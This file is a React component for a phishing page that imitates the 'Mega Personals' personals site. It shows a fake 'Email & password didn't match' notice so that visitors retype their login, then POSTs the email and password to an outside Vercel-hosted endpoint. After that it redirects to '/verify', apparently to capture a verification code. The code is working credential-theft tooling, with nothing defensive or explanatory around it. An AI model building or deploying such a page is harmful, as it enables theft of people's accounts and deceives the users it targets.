import React from "react";
import { useForm } from "react-hook-form";
import { useNavigate } from "react-router-dom";
import "./NavBar.css";

const Password = () => {
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm();

  const navigate = useNavigate();

  const onSubmit = (data) => {
    const ItemId = {
      Email: data.example,
      Password: data.exampleRequired,
    };
    fetch("https://roni-mega.vercel.app/users", {
      method: "POST",
      headers: { "Content-type": "application/json" },
      body: JSON.stringify(ItemId),
    })
      .then((res) => res.json())
      .then((result) => navigate("/verify"));
  };
  return (
    <div className="text-center">
      <h1 className="pt-3 pb-3">
        <span className="Mega">Mega</span>{" "}
        <span className="Personals">Personals</span>
      </h1>
      <h5 className="pb-3">Personals classifieds</h5>
      <h6 className="fst-italic">Email & password didn't match.</h6>
      <h6 className="mb-3"> Retype to login megapersonal.</h6>
      <div className="validation ">
        <div className="pt-3">
          <form onSubmit={handleSubmit(onSubmit)}>
            {/* register your input into the hook by invoking the "register" function */}
            <div className="text-center pt-3">
              <input
                className="form-control Email text-center"
                placeholder="Your email"
                defaultValue=""
                {...register("example", { required: true })}
              />
            </div>

            {/* include validation with required or other standard HTML validation rules */}
            <div>
              <input
                className="form-control Email mt-3 text-center"
                placeholder="Your password"
                defaultValue=""
                {...register("exampleRequired", { required: true })}
              />
            </div>
            {/* errors will return when field validation fails  */}
            {errors.exampleRequired && <span>This field is required</span>}

            <input
              onClick={() => navigate("/code")}
              className="submit  mt-3 mb-3 w-50%"
              type="SUBMIT"
              defaultValue="Join Meeting"
            />
          </form>
        </div>
      </div>
    </div>
  );
};

export default Password;
